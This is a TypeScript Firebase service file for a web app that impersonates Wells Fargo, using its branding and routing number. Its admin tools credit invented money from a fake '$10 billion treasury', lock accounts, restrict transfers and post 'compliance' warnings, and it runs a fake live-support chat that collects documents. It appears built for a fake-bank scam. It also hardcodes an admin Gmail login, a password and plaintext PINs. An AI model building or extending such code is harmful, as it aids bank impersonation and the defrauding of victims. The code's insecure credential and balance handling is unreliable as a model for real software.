import { 
  collection, 
  doc, 
  getDoc, 
  getDocs, 
  setDoc, 
  updateDoc, 
  query, 
  where, 
  orderBy, 
  limit, 
  onSnapshot 
} from 'firebase/firestore';
import { db, handleFirestoreError, OperationType } from '../lib/firebase.ts';
import { 
  BankUser, 
  BankTransaction, 
  AdminTreasury, 
  AuditLog, 
  SupportThread, 
  SupportMessage 
} from '../types/banking.ts';

export const ADMIN_EMAIL = 'managementofficails001@gmail.com';
export const ADMIN_DEFAULT_PASS = 'smart446688';
export const INITIAL_TREASURY_BALANCE = 10_000_000_000.00; // 10 Billion USD
export const WELLS_FARGO_ROUTING = '121000247'; // Official Wells Fargo FedWire Routing

// Helper to generate unique account numbers
export function generateAccountNumber(): string {
  const prefix = '48'; // Wells Fargo commercial identifier
  const randomPart = Math.floor(10000000 + Math.random() * 90000000).toString();
  return `${prefix}${randomPart.slice(0, 8)}`;
}

export function generateRoutingNumber(): string {
  return WELLS_FARGO_ROUTING;
}

export function generateReference(type: 'INT' | 'WIRE' | 'FUND' | 'REV'): string {
  const random = Math.random().toString(36).substring(2, 8).toUpperCase();
  const timestamp = Date.now().toString().slice(-4);
  return `WF-${type}-${timestamp}-${random}`;
}

// Format currency
export function formatCurrency(amount: number, currency: string = 'USD'): string {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: currency,
    minimumFractionDigits: 2,
    maximumFractionDigits: 2
  }).format(amount || 0);
}

// ---------------- TREASURY INITIALIZATION ----------------
export async function getOrInitializeTreasury(): Promise<AdminTreasury> {
  const treasuryRef = doc(db, 'adminTreasury', 'vault');
  const initialTreasury: AdminTreasury = {
    id: 'vault',
    institutionName: 'Wells Fargo Institutional Treasury Vault',
    balance: INITIAL_TREASURY_BALANCE,
    currency: 'USD',
    lastUpdated: new Date().toISOString(),
    totalFundedToUsers: 0,
    totalReversed: 0
  };

  try {
    const snap = await getDoc(treasuryRef);
    if (snap.exists()) {
      return snap.data() as AdminTreasury;
    }

    await setDoc(treasuryRef, initialTreasury);
    return initialTreasury;
  } catch (err) {
    console.warn('Treasury vault sync notice (using default $10B reserve):', err);
    return initialTreasury;
  }
}

// ---------------- INITIAL SEEDING ----------------
export async function seedInitialBankDataIfEmpty() {
  try {
    // 1. Ensure Treasury exists with 10 Billion USD
    await getOrInitializeTreasury();

    // 2. Ensure Admin User profile exists with Wells Fargo Operator identity
    const adminQuery = query(collection(db, 'users'), where('email', '==', ADMIN_EMAIL));
    const adminDocs = await getDocs(adminQuery);
    if (adminDocs.empty) {
      const adminUid = 'wells_fargo_admin_operator_master';
      const adminProfile: BankUser = {
        uid: adminUid,
        email: ADMIN_EMAIL,
        fullName: 'Wells Fargo Bank Operator Management',
        role: 'admin',
        accountNumber: '4800000001',
        routingNumber: WELLS_FARGO_ROUTING,
        balance: INITIAL_TREASURY_BALANCE, // 10 Billion USD for operator
        currency: 'USD',
        isLocked: false,
        isTransferRestricted: false,
        transactionPin: '4466',
        accountType: 'Corporate Treasury',
        createdAt: new Date().toISOString()
      };
      await setDoc(doc(db, 'users', adminUid), adminProfile);
    }

    // 3. Seed demo customers if database is fresh
    const allUsersSnap = await getDocs(collection(db, 'users'));
    if (allUsersSnap.size <= 1) {
      const demoUsers: Partial<BankUser>[] = [
        {
          uid: 'demo_user_elena_vance',
          email: 'elena.vance@vancetech.io',
          fullName: 'Elena Vance',
          role: 'customer',
          accountNumber: '4849102941',
          routingNumber: WELLS_FARGO_ROUTING,
          balance: 145200.50,
          currency: 'USD',
          isLocked: false,
          isTransferRestricted: false,
          transactionPin: '1234',
          phone: '+1 (555) 349-8812',
          address: '742 Evergreen Terrace, Palo Alto, CA',
          accountType: 'Private Wealth',
          createdAt: new Date(Date.now() - 30 * 86400000).toISOString()
        },
        {
          uid: 'demo_user_marcus_sterling',
          email: 'm.sterling@sterlingcapital.com',
          fullName: 'Marcus Sterling',
          role: 'customer',
          accountNumber: '4892019482',
          routingNumber: WELLS_FARGO_ROUTING,
          balance: 850000.00,
          currency: 'USD',
          isLocked: false,
          isTransferRestricted: false,
          transactionPin: '9988',
          phone: '+1 (555) 890-4411',
          address: '450 Park Avenue, Penthouse B, New York, NY',
          accountType: 'Corporate Treasury',
          createdAt: new Date(Date.now() - 45 * 86400000).toISOString()
        },
        {
          uid: 'demo_user_david_chen',
          email: 'david.chen@chenlogistics.com',
          fullName: 'David Chen',
          role: 'customer',
          accountNumber: '4810948274',
          routingNumber: WELLS_FARGO_ROUTING,
          balance: 32450.00,
          currency: 'USD',
          isLocked: false,
          isTransferRestricted: false,
          warningMessage: 'Compliance note: Please submit updated beneficial ownership declaration.',
          transactionPin: '4321',
          phone: '+1 (555) 234-9018',
          address: '120 Market Street, Suite 400, San Francisco, CA',
          accountType: 'Checking',
          createdAt: new Date(Date.now() - 15 * 86400000).toISOString()
        }
      ];

      for (const u of demoUsers) {
        await setDoc(doc(db, 'users', u.uid!), u);
      }

      // Add sample transactions
      const sampleTx1: BankTransaction = {
        id: 'tx_seed_001',
        senderId: 'demo_user_marcus_sterling',
        senderName: 'Marcus Sterling',
        senderAccount: '4892019482',
        recipientId: 'demo_user_elena_vance',
        recipientName: 'Elena Vance',
        recipientAccount: '4849102941',
        amount: 25000.00,
        fee: 0,
        type: 'internal',
        status: 'completed',
        description: 'Venture Capital syndication tranche',
        reference: 'WF-INT-8910-VC99',
        createdAt: new Date(Date.now() - 5 * 86400000).toISOString()
      };
      await setDoc(doc(db, 'transactions', sampleTx1.id), sampleTx1);
    }
  } catch (err) {
    console.warn('Initial bank seeding notice (safe to continue):', err);
  }
}

// ---------------- USER OPERATIONS ----------------
export async function getUserProfile(uid: string): Promise<BankUser | null> {
  try {
    const snap = await getDoc(doc(db, 'users', uid));
    if (snap.exists()) {
      return snap.data() as BankUser;
    }
    return null;
  } catch (err) {
    handleFirestoreError(err, OperationType.GET, `users/${uid}`);
  }
}

export async function updateUserProfile(
  uid: string, 
  data: Partial<Pick<BankUser, 'fullName' | 'phone' | 'address' | 'accountType'>>
): Promise<void> {
  try {
    const userRef = doc(db, 'users', uid);
    await updateDoc(userRef, {
      ...data,
      updatedAt: new Date().toISOString()
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${uid}`);
  }
}

export async function setupTransactionPin(uid: string, pin: string): Promise<void> {
  if (!/^\d{4}$/.test(pin)) {
    throw new Error('Transaction PIN must be exactly 4 numerical digits.');
  }
  try {
    const userRef = doc(db, 'users', uid);
    await updateDoc(userRef, {
      transactionPin: pin,
      updatedAt: new Date().toISOString()
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${uid}`);
  }
}

// ---------------- AUDIT LOG HELPER ----------------
export async function createAuditLog(
  actor: string,
  action: AuditLog['action'],
  details: string,
  targetUser?: string
): Promise<void> {
  const logId = `log_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
  const logRef = doc(db, 'auditLogs', logId);
  const log: AuditLog = {
    id: logId,
    actor,
    action,
    details,
    targetUser,
    timestamp: new Date().toISOString()
  };
  try {
    await setDoc(logRef, log);
  } catch (err) {
    console.warn('Audit log write error:', err);
  }
}

// ---------------- INTERNAL TRANSFERS ----------------
export async function executeInternalTransfer(
  sender: BankUser,
  recipientIdentifier: string, // account number or email
  amount: number,
  pin: string,
  memo: string
): Promise<BankTransaction> {
  if (sender.isLocked) {
    throw new Error('Your account is currently locked by bank management. Outgoing transfers are halted.');
  }
  if (sender.isTransferRestricted) {
    throw new Error('Transfer restrictions have been placed on your account. Please contact Wells Fargo Compliance.');
  }
  if (amount <= 0) {
    throw new Error('Transfer amount must be greater than zero.');
  }
  if (sender.balance < amount) {
    throw new Error(`Insufficient funds. Your available balance is ${formatCurrency(sender.balance, sender.currency)}.`);
  }
  if (!sender.transactionPin) {
    throw new Error('You have not set up your 4-digit Transaction PIN. Please set up your PIN in Profile settings first.');
  }
  if (sender.transactionPin !== pin) {
    throw new Error('Invalid Transaction PIN. Verification failed.');
  }

  // Look up recipient
  const cleanId = recipientIdentifier.trim();
  let recipientSnap = await getDocs(query(collection(db, 'users'), where('accountNumber', '==', cleanId)));
  if (recipientSnap.empty) {
    recipientSnap = await getDocs(query(collection(db, 'users'), where('email', '==', cleanId.toLowerCase())));
  }

  if (recipientSnap.empty) {
    throw new Error(`Recipient account "${cleanId}" was not found in Wells Fargo network.`);
  }

  const recipientDoc = recipientSnap.docs[0];
  const recipient = recipientDoc.data() as BankUser;

  if (recipient.uid === sender.uid) {
    throw new Error('You cannot transfer funds to your own account.');
  }

  const txId = `tx_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const refCode = generateReference('INT');

  const newTx: BankTransaction = {
    id: txId,
    senderId: sender.uid,
    senderName: sender.fullName,
    senderAccount: sender.accountNumber,
    recipientId: recipient.uid,
    recipientName: recipient.fullName,
    recipientAccount: recipient.accountNumber,
    amount: amount,
    fee: 0,
    type: 'internal',
    status: 'completed',
    description: memo || 'Wells Fargo P2P Transfer',
    reference: refCode,
    createdAt: new Date().toISOString()
  };

  try {
    await updateDoc(doc(db, 'users', sender.uid), {
      balance: sender.balance - amount,
      updatedAt: new Date().toISOString()
    });

    await updateDoc(doc(db, 'users', recipient.uid), {
      balance: (recipient.balance || 0) + amount,
      updatedAt: new Date().toISOString()
    });

    await setDoc(doc(db, 'transactions', txId), newTx);

    await createAuditLog(
      sender.email,
      'TRANSFER_INTERNAL',
      `Transferred ${formatCurrency(amount)} to ${recipient.fullName} (${recipient.accountNumber}). Ref: ${refCode}`,
      recipient.email
    );

    return newTx;
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'transactions');
  }
}

// ---------------- INTERNATIONAL WIRE TRANSFERS ----------------
export async function executeInternationalTransfer(
  sender: BankUser,
  params: {
    recipientName: string;
    country: string;
    bankName: string;
    swiftCode: string;
    accountOrIban: string;
    amount: number;
    pin: string;
    memo: string;
  }
): Promise<BankTransaction> {
  const { recipientName, country, bankName, swiftCode, accountOrIban, amount, pin, memo } = params;

  if (sender.isLocked) {
    throw new Error('Your account is currently locked by bank management. Outgoing transfers are halted.');
  }
  if (sender.isTransferRestricted) {
    throw new Error('Transfer restrictions have been placed on your account. Please contact Wells Fargo Compliance.');
  }
  if (amount <= 0) {
    throw new Error('Wire amount must be greater than zero.');
  }

  const wireFee = 25.00; // Wells Fargo Standard Wire Fee
  const totalDeduction = amount + wireFee;

  if (sender.balance < totalDeduction) {
    throw new Error(`Insufficient funds. Transfer requires ${formatCurrency(totalDeduction)} (including ${formatCurrency(wireFee)} SWIFT fee).`);
  }
  if (!sender.transactionPin) {
    throw new Error('Please set up your 4-digit Transaction PIN in Profile settings first.');
  }
  if (sender.transactionPin !== pin) {
    throw new Error('Invalid Transaction PIN. Verification failed.');
  }

  const txId = `tx_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const refCode = generateReference('WIRE');

  const newTx: BankTransaction = {
    id: txId,
    senderId: sender.uid,
    senderName: sender.fullName,
    senderAccount: sender.accountNumber,
    recipientId: 'EXTERNAL_BENEFICIARY',
    recipientName,
    recipientAccount: accountOrIban,
    recipientBank: bankName,
    recipientCountry: country,
    swiftCode: swiftCode,
    amount: amount,
    fee: wireFee,
    type: 'international',
    status: 'completed',
    description: memo || `International Wire to ${country}`,
    reference: refCode,
    createdAt: new Date().toISOString()
  };

  try {
    await updateDoc(doc(db, 'users', sender.uid), {
      balance: sender.balance - totalDeduction,
      updatedAt: new Date().toISOString()
    });

    await setDoc(doc(db, 'transactions', txId), newTx);

    await createAuditLog(
      sender.email,
      'TRANSFER_INTERNATIONAL',
      `Sent ${formatCurrency(amount)} via SWIFT (${swiftCode}) to ${recipientName} in ${country}. Fee: $25. Ref: ${refCode}`,
      accountOrIban
    );

    return newTx;
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'transactions');
  }
}

// ---------------- LIVE SUPPORT CHAT WITH PICTURES & DOCUMENTS ----------------
export async function getOrCreateSupportThread(user: BankUser): Promise<SupportThread> {
  const threadId = `thread_${user.uid}`;
  const threadRef = doc(db, 'supportThreads', threadId);

  try {
    const snap = await getDoc(threadRef);
    if (snap.exists()) {
      return snap.data() as SupportThread;
    }

    const newThread: SupportThread = {
      id: threadId,
      userId: user.uid,
      userEmail: user.email,
      userName: user.fullName,
      userAccountNumber: user.accountNumber,
      lastMessage: 'Welcome to Wells Fargo 24/7 Client Care. How can we assist you today?',
      lastMessageTimestamp: new Date().toISOString(),
      unreadByAdmin: false,
      unreadByUser: false,
      status: 'open',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString()
    };

    await setDoc(threadRef, newThread);

    // Initial greeting message from support
    const welcomeMsg: SupportMessage = {
      id: `msg_welcome_${Date.now()}`,
      threadId,
      senderId: 'ADMIN_OPERATOR',
      senderName: 'Wells Fargo Representative',
      senderRole: 'admin',
      text: `Hello ${user.fullName}, welcome to Wells Fargo Live Support. A dedicated banking specialist is here to assist you with transfers, document verification, account inquiries, or security assistance. You can also attach pictures or documents directly.`,
      timestamp: new Date().toISOString()
    };

    await setDoc(doc(db, 'supportThreads', threadId, 'messages', welcomeMsg.id), welcomeMsg);

    return newThread;
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, `supportThreads/${threadId}`);
  }
}

export async function sendSupportMessage(
  threadId: string,
  sender: { uid: string; name: string; role: 'customer' | 'admin' },
  text: string,
  attachment?: {
    url: string; // Base64 or image URL
    name: string;
    type: 'image' | 'document';
  }
): Promise<SupportMessage> {
  const msgId = `msg_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
  const msgRef = doc(db, 'supportThreads', threadId, 'messages', msgId);
  const threadRef = doc(db, 'supportThreads', threadId);

  const message: SupportMessage = {
    id: msgId,
    threadId,
    senderId: sender.uid,
    senderName: sender.name,
    senderRole: sender.role,
    text: text.trim(),
    attachmentUrl: attachment?.url,
    attachmentName: attachment?.name,
    attachmentType: attachment?.type,
    timestamp: new Date().toISOString()
  };

  try {
    await setDoc(msgRef, message);

    const preview = text.trim() || (attachment ? `[Attachment: ${attachment.name}]` : 'New message');

    await updateDoc(threadRef, {
      lastMessage: preview,
      lastMessageTimestamp: message.timestamp,
      unreadByAdmin: sender.role === 'customer' ? true : false,
      unreadByUser: sender.role === 'admin' ? true : false,
      updatedAt: message.timestamp
    });

    return message;
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, `supportThreads/${threadId}/messages`);
  }
}

export function subscribeToSupportMessages(threadId: string, callback: (msgs: SupportMessage[]) => void) {
  const q = query(
    collection(db, 'supportThreads', threadId, 'messages'),
    orderBy('timestamp', 'asc'),
    limit(100)
  );

  return onSnapshot(
    q,
    (snap) => {
      callback(snap.docs.map(d => d.data() as SupportMessage));
    },
    (err) => {
      console.warn(`Support messages listener notice for thread ${threadId}:`, err);
    }
  );
}

export function subscribeToAllSupportThreads(callback: (threads: SupportThread[]) => void) {
  const q = query(
    collection(db, 'supportThreads'),
    orderBy('lastMessageTimestamp', 'desc'),
    limit(50)
  );

  return onSnapshot(
    q,
    (snap) => {
      callback(snap.docs.map(d => d.data() as SupportThread));
    },
    (err) => {
      console.warn('Support threads listener notice:', err);
    }
  );
}

export async function markThreadRead(threadId: string, role: 'customer' | 'admin') {
  try {
    const threadRef = doc(db, 'supportThreads', threadId);
    if (role === 'admin') {
      await updateDoc(threadRef, { unreadByAdmin: false });
    } else {
      await updateDoc(threadRef, { unreadByUser: false });
    }
  } catch (e) {
    // ignore
  }
}

// ---------------- ADMIN MANAGEMENT OPERATIONS ----------------
// 1. FUND CUSTOMER
export async function adminFundCustomer(
  adminEmail: string,
  targetUserId: string,
  amount: number,
  memo: string = 'Wells Fargo Treasury Liquidity Disbursement'
): Promise<BankTransaction> {
  if (amount <= 0) {
    throw new Error('Funding amount must be greater than zero.');
  }

  const userRef = doc(db, 'users', targetUserId);
  const userSnap = await getDoc(userRef);
  if (!userSnap.exists()) {
    throw new Error('Target customer was not found in Wells Fargo directory.');
  }
  const customer = userSnap.data() as BankUser;

  const treasuryRef = doc(db, 'adminTreasury', 'vault');
  const treasurySnap = await getDoc(treasuryRef);
  let treasury = treasurySnap.exists() ? (treasurySnap.data() as AdminTreasury) : await getOrInitializeTreasury();

  const txId = `tx_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
  const refCode = generateReference('FUND');

  const fundingTx: BankTransaction = {
    id: txId,
    senderId: 'SYSTEM_OPERATOR',
    senderName: 'Wells Fargo Central Treasury Vault',
    senderAccount: '4800000001',
    recipientId: customer.uid,
    recipientName: customer.fullName,
    recipientAccount: customer.accountNumber,
    amount: amount,
    fee: 0,
    type: 'funding',
    status: 'completed',
    description: memo,
    reference: refCode,
    createdAt: new Date().toISOString()
  };

  try {
    // 1. Credit customer
    await updateDoc(userRef, {
      balance: (customer.balance || 0) + amount,
      updatedAt: new Date().toISOString()
    });

    // 2. Decrement treasury reserve & track distributed liquidity
    await updateDoc(treasuryRef, {
      balance: (treasury.balance || INITIAL_TREASURY_BALANCE) - amount,
      totalFundedToUsers: (treasury.totalFundedToUsers || 0) + amount,
      lastUpdated: new Date().toISOString()
    });

    // 3. Save funding transaction
    await setDoc(doc(db, 'transactions', txId), fundingTx);

    // 4. Audit
    await createAuditLog(
      adminEmail,
      'FUND_ACCOUNT',
      `Funded customer ${customer.fullName} (${customer.accountNumber}) with ${formatCurrency(amount)}. Reason: ${memo}. Ref: ${refCode}`,
      customer.email
    );

    return fundingTx;
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'users');
  }
}

// 2. REVERSE TRANSACTION
export async function adminReverseTransaction(
  adminEmail: string,
  transactionId: string,
  reason: string = 'Administrative reversal by Wells Fargo Operator'
): Promise<BankTransaction> {
  const txRef = doc(db, 'transactions', transactionId);
  const txSnap = await getDoc(txRef);
  if (!txSnap.exists()) {
    throw new Error('Transaction record not found.');
  }
  const tx = txSnap.data() as BankTransaction;

  if (tx.status === 'reversed') {
    throw new Error('This transaction has already been reversed.');
  }

  try {
    // Rollback according to transaction type
    if (tx.type === 'internal') {
      // Debit recipient
      const recRef = doc(db, 'users', tx.recipientId);
      const recSnap = await getDoc(recRef);
      if (recSnap.exists()) {
        const rec = recSnap.data() as BankUser;
        await updateDoc(recRef, {
          balance: Math.max(0, (rec.balance || 0) - tx.amount),
          updatedAt: new Date().toISOString()
        });
      }

      // Credit back sender
      const sendRef = doc(db, 'users', tx.senderId);
      const sendSnap = await getDoc(sendRef);
      if (sendSnap.exists()) {
        const send = sendSnap.data() as BankUser;
        await updateDoc(sendRef, {
          balance: (send.balance || 0) + tx.amount,
          updatedAt: new Date().toISOString()
        });
      }
    } else if (tx.type === 'international') {
      // Refund sender the full amount + wire fee
      const sendRef = doc(db, 'users', tx.senderId);
      const sendSnap = await getDoc(sendRef);
      if (sendSnap.exists()) {
        const send = sendSnap.data() as BankUser;
        await updateDoc(sendRef, {
          balance: (send.balance || 0) + tx.amount + (tx.fee || 0),
          updatedAt: new Date().toISOString()
        });
      }
    } else if (tx.type === 'funding') {
      // Reclaiming funding: debit customer
      const recRef = doc(db, 'users', tx.recipientId);
      const recSnap = await getDoc(recRef);
      if (recSnap.exists()) {
        const rec = recSnap.data() as BankUser;
        await updateDoc(recRef, {
          balance: Math.max(0, (rec.balance || 0) - tx.amount),
          updatedAt: new Date().toISOString()
        });
      }

      // Return to treasury
      const treasuryRef = doc(db, 'adminTreasury', 'vault');
      const treasurySnap = await getDoc(treasuryRef);
      if (treasurySnap.exists()) {
        const t = treasurySnap.data() as AdminTreasury;
        await updateDoc(treasuryRef, {
          balance: (t.balance || INITIAL_TREASURY_BALANCE) + tx.amount,
          totalFundedToUsers: Math.max(0, (t.totalFundedToUsers || 0) - tx.amount),
          totalReversed: (t.totalReversed || 0) + tx.amount,
          lastUpdated: new Date().toISOString()
        });
      }
    }

    // Update transaction status
    const updatedTx: BankTransaction = {
      ...tx,
      status: 'reversed',
      reversedAt: new Date().toISOString(),
      reversedBy: adminEmail,
      reversalReason: reason
    };

    await updateDoc(txRef, {
      status: 'reversed',
      reversedAt: updatedTx.reversedAt,
      reversedBy: adminEmail,
      reversalReason: reason
    });

    await createAuditLog(
      adminEmail,
      'REVERSE_TRANSACTION',
      `Reversed transaction ${tx.reference} (${formatCurrency(tx.amount)}). Reason: ${reason}`,
      tx.recipientName
    );

    return updatedTx;
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `transactions/${transactionId}`);
  }
}

// 3. LOCK / UNLOCK ACCOUNT
export async function adminSetAccountLock(
  adminEmail: string,
  targetUserId: string,
  isLocked: boolean,
  reason?: string
): Promise<void> {
  const userRef = doc(db, 'users', targetUserId);
  const snap = await getDoc(userRef);
  if (!snap.exists()) {
    throw new Error('User not found.');
  }
  const u = snap.data() as BankUser;

  try {
    await updateDoc(userRef, {
      isLocked,
      updatedAt: new Date().toISOString()
    });

    await createAuditLog(
      adminEmail,
      isLocked ? 'LOCK_ACCOUNT' : 'UNLOCK_ACCOUNT',
      `${isLocked ? 'Locked' : 'Unlocked'} account of ${u.fullName} (${u.email}). Reason: ${reason || 'Operator directive'}`,
      u.email
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${targetUserId}`);
  }
}

// 4. RESTRICT / UNRESTRICT TRANSFERS
export async function adminSetTransferRestriction(
  adminEmail: string,
  targetUserId: string,
  isRestricted: boolean,
  reason?: string
): Promise<void> {
  const userRef = doc(db, 'users', targetUserId);
  const snap = await getDoc(userRef);
  if (!snap.exists()) {
    throw new Error('User not found.');
  }
  const u = snap.data() as BankUser;

  try {
    await updateDoc(userRef, {
      isTransferRestricted: isRestricted,
      updatedAt: new Date().toISOString()
    });

    await createAuditLog(
      adminEmail,
      isRestricted ? 'RESTRICT_TRANSFERS' : 'UNRESTRICT_TRANSFERS',
      `${isRestricted ? 'Restricted' : 'Lifted transfer restrictions on'} ${u.fullName} (${u.email}). Reason: ${reason || 'Operator directive'}`,
      u.email
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${targetUserId}`);
  }
}

// 5. POST OR CLEAR WARNING MESSAGE
export async function adminSetWarningMessage(
  adminEmail: string,
  targetUserId: string,
  warningMessage: string
): Promise<void> {
  const userRef = doc(db, 'users', targetUserId);
  const snap = await getDoc(userRef);
  if (!snap.exists()) {
    throw new Error('User not found.');
  }
  const u = snap.data() as BankUser;

  try {
    await updateDoc(userRef, {
      warningMessage: warningMessage.trim(),
      updatedAt: new Date().toISOString()
    });

    await createAuditLog(
      adminEmail,
      warningMessage.trim() ? 'ISSUE_WARNING' : 'CLEAR_WARNING',
      warningMessage.trim() 
        ? `Issued warning to ${u.fullName}: "${warningMessage.trim()}"` 
        : `Cleared compliance warning for ${u.fullName}`,
      u.email
    );
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${targetUserId}`);
  }
}

// 6. REAL-TIME SUBSCRIBERS
export function subscribeToUser(uid: string, callback: (user: BankUser | null) => void) {
  return onSnapshot(
    doc(db, 'users', uid),
    (snap) => {
      if (snap.exists()) {
        callback(snap.data() as BankUser);
      } else {
        callback(null);
      }
    },
    (err) => {
      console.warn(`User profile listener notice for ${uid}:`, err);
    }
  );
}

export function subscribeToUserTransactions(uid: string, callback: (txs: BankTransaction[]) => void) {
  const q = query(collection(db, 'transactions'), orderBy('createdAt', 'desc'), limit(50));
  return onSnapshot(
    q,
    (snap) => {
      const seen = new Set<string>();
      const list: BankTransaction[] = [];
      snap.docs.forEach((d) => {
        const t = d.data() as BankTransaction;
        const id = t.id || d.id;
        if (id && !seen.has(id)) {
          seen.add(id);
          if (t.senderId === uid || t.recipientId === uid) {
            list.push({ ...t, id });
          }
        }
      });
      callback(list);
    },
    (err) => {
      console.warn('User transactions listener notice:', err);
    }
  );
}

export function subscribeToAllUsers(callback: (users: BankUser[]) => void) {
  const q = query(collection(db, 'users'), orderBy('createdAt', 'desc'));
  return onSnapshot(
    q,
    (snap) => {
      const seenUids = new Set<string>();
      const seenEmails = new Set<string>();
      const uniqueUsers: BankUser[] = [];

      snap.docs.forEach((d) => {
        const data = d.data() as BankUser;
        const uid = data.uid || d.id;
        const cleanEmail = (data.email || '').toLowerCase().trim();

        // Prevent duplicate user entries (e.g. operator aliases or duplicate seeding docs)
        if (seenUids.has(uid) || (cleanEmail && seenEmails.has(cleanEmail))) {
          return;
        }

        seenUids.add(uid);
        if (cleanEmail) seenEmails.add(cleanEmail);
        uniqueUsers.push({ ...data, uid });
      });

      callback(uniqueUsers);
    },
    (err) => {
      console.warn('All users directory listener notice:', err);
    }
  );
}

export function subscribeToAllTransactions(callback: (txs: BankTransaction[]) => void) {
  const q = query(collection(db, 'transactions'), orderBy('createdAt', 'desc'), limit(100));
  return onSnapshot(
    q,
    (snap) => {
      const seen = new Set<string>();
      const list: BankTransaction[] = [];
      snap.docs.forEach((d) => {
        const t = d.data() as BankTransaction;
        const id = t.id || d.id;
        if (id && !seen.has(id)) {
          seen.add(id);
          list.push({ ...t, id });
        }
      });
      callback(list);
    },
    (err) => {
      console.warn('All transactions listener notice:', err);
    }
  );
}

export function subscribeToTreasury(callback: (treasury: AdminTreasury) => void) {
  return onSnapshot(
    doc(db, 'adminTreasury', 'vault'),
    (snap) => {
      if (snap.exists()) {
        callback(snap.data() as AdminTreasury);
      }
    },
    (err) => {
      console.warn('Treasury vault listener notice:', err);
    }
  );
}

export function subscribeToAuditLogs(callback: (logs: AuditLog[]) => void) {
  const q = query(collection(db, 'auditLogs'), orderBy('timestamp', 'desc'), limit(50));
  return onSnapshot(
    q,
    (snap) => {
      const seen = new Set<string>();
      const list: AuditLog[] = [];
      snap.docs.forEach((d) => {
        const l = d.data() as AuditLog;
        const id = l.id || d.id;
        if (id && !seen.has(id)) {
          seen.add(id);
          list.push({ ...l, id });
        }
      });
      callback(list);
    },
    (err) => {
      console.warn('Audit logs listener notice:', err);
    }
  );
}
